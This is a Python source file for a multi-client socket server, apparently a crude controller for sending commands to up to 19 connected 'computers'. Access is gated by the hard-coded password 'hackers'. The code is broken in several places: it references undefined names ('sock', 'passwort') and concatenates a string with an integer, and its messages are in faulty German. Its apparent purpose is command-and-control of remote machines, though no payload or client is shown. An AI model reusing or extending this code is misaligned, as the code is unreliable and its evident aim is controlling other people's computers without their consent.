# -*- coding: utf-8 -*-
from getpass import getpass
import threading

import socket

SOCKET = socket.socket()

#			   ["", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "",]
#   computer    1   2   3   4   5   6   7   8   9   10  11  12  13  14  15  16  17  18  19
connect_list = []
address_list = []

PASSWORT = "hackers"
IP = None
PORT = None
LISTEN = None
CONNECTS = 0
THREAD = None

index = 0

STATUS = 0
# 0 - no SOCKET
# 1 - created SOCKET, but no connectThread and no CONNECTS
# 2 - created SOCKET and connectThread, but no  no CONNECTS
# 3 - created SOCKET, connectThread, and have CONNECTS


def printInfo():
	s = None
	if STATUS == 0:
		s = "No SOCKET!"
	elif STATUS == 1:
		s = "SOCKET created | No connectThread | No CONNECTS"
	elif STATUS == 2:
		s = "SOCKET created | connectThread created | No CONNECTS"
	elif STATUS == 3:
		s = "SOCKET created | connectThread created | CONNECTS > 0"
	else:
		s = "ERROR!!!"

	print()
	print("________INFO________")
	print("STATUS:", s)
	print("IP sever`s:", IP)
	print("PORT sever`s:", PORT)
	print("LISTEN sever`s:", LISTEN)
	print("PASSWORT sever`s:", PASSWORT)
	print("CONNECTS sever`s:", CONNECTS)
	print()

def printHelp():
	print()
	print("________Commands________")
	print("connect")
	print("info")
	print("help")
	print("list")

def printList():
	print()
	print("________List________")
	for number in range(CONNECTS):
		print(address_list[number])

def login():
	global PASSWORT

	i = 0

	while i < 4:
		p = str(getpass("password: "))

		if p == PASSWORT:	
			return 1234
		print("Incorrect password.")
		i += 1

	print("Authorization completed unsuccessfully!")


def connected(i):
	index = 0

	if i > 19:
		i = 19
	if i == 0:
		i = 19

	while index < i:
		connect_list[index] , address_list[index] = sock.accept()
		index += 1


def ret(msg):
	if msg == '0':
		print("Sehr gut!")
	elif msg == '1':
		print("<Client> hat dich nicht versteht!")
	elif msg == '2':
		print("Hast du nicht versteht?!")


def send_one_computer(msg, num):
	obj = connect_list[num]
	obj.send(msg.encode("utf-8"))
	return obj.recv(1024)


def computer():
	num_comp = input("Enter <number> computer`s  (int <= 19  oder  int == !100!)  : ")
	data = input("Enter command: ")
	num_comp = int(num_comp)

	if num_comp <= 19 and num_comp > 0:
		num_comp -= 1
		return send_one_computer(data, num_comp)
	else:
		return "qwerty"

class ConnectUsersThread(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)
		self.daemon = True

	def connectingUsersThread():
		global connect_list
		global address_list
		global CONNECTS
		global STATUS

		while True:
			connect , address = SOCKET.accept()
			connect_list.append(connect)
			address_list.append(address)

			CONNECTS += 1
			STATUS = 3

	def run(self):
		global connect_list
		global address_list
		global CONNECTS
		global STATUS

		while True:
			connect , address = SOCKET.accept()
			connect_list.append(connect)
			address_list.append(address)

			CONNECTS += 1
			STATUS = 3

def connectCommand():
	global THREAD
	global STATUS

	THREAD = ConnectUsersThread()
	THREAD.start()

	STATUS = 2

def sendCommand():
	print()
	print("Connected" + CONNECTS + "users")

	i = input("Enter number CONNECTS   (int or <all>)  : ")
	connected(i)


def interface():
	while True:
		try:
			command = str(input("Enter command: "))
		except Exception as EOFError:
			pass

		if command == 'exit':
			break		
		elif command == 'connect':
			if login() == 1234:
				connectCommand()
		elif command == 'info':
			printInfo()
		elif command == 'help':
			printHelp()
		elif command == 'list':
			printList()
		elif command == 'send':
			p = input("Passwort: ")
			if p == passwort:
				data_get = computer()
				if data_get != "qwerty":
					ret(data_get.decode("utf-8"))
		elif not command:
			print("You not enter command!")
			continue
		else:
			print("Wir weisen diese <Command> nicht!")
		print()

def createSocket():
	global IP
	global PORT
	global LISTEN
	global SOCKET
	global STATUS

	print()
	
	IP = str(input("IP: "))
	PORT = int(input("PORT: "))
	LISTEN = int(input("LISTEN: "))

	print("Creating Socket...")

	SOCKET.bind((IP , PORT))
	SOCKET.listen(LISTEN)

	STATUS = 1

	print("Socket created successfully!")
	print()

def destroySocket():
	SOCKET.close()

def main():
	createSocket()
	printInfo()

	interface()

	destroySocket()

if __name__ == '__main__':
	main()

print("Auf fiedersehen!")
